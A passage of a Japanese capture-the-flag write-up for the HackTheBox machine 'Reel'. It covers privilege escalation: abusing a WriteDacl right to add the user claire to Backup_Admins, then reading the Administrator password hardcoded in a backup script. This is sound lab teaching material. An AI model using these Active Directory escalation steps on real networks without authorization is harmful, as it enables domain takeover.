@@ -285,3 +285,56 @@ PS C:\Users\tom> Set-DomainUserPassword -Identity claire -AccountPassword $passw
 └─$ ssh claire@10.10.10.77
 ```
 
+# privesc
+
+claireのシェルがとれたところで、再びacls.csvをclaireに着目してみてみる。
+
+```
+┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
+└─$ grep claire acls.csv
+"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"
+...
+```
+claireはBackup_Adminsというグループに対してWriteDaclの権限をもっている（[WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)について）。
+
+そこで、次のようにclaireをBackupAdminsグループに追加する：
+
+```
+PS C:\Users\claire> net group "Backup_Admins" claire /add                                                                       
+The command completed successfully.
+```
+
+このグループ追加を反映させるためにclaireの新しいシェルを起動する。そうするとAdminフォルダへのアクセス権限が得られる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
+└─$ ssh claire@10.10.10.77
+...
+claire@REEL C:\Users\claire> cd C:\Users\Administrator\Desktop
+claire@REEL C:\Users\Administrator\Desktop>dir /a                                                         
+ Volume in drive C has no label.                                                                          
+ Volume Serial Number is CC8A-33E1                                                                        
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/21/2018  02:56 PM    <DIR>          . 
+01/21/2018  02:56 PM    <DIR>          ..
+11/02/2017  09:47 PM    <DIR>          Backup Scripts
+10/27/2017  11:00 PM               282 desktop.ini
+10/28/2017  11:56 AM                32 root.txt 
+```
+
+Backup_AdminsのメンバがいかにもアクセスできそうなフォルダBackup Scriptsがあった。
+
+以下のようにAdministratorのパスワードを発見：
+
+```
+claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1
+# admin password
+$password="Cr4ckMeIfYouC4n!" 
+
+#Variables, only Change here 
+...
+```
+
+パスワード"Cr4ckMeIfYouC4n!"でAdminへssh接続すればAdminのシェルがとれる。
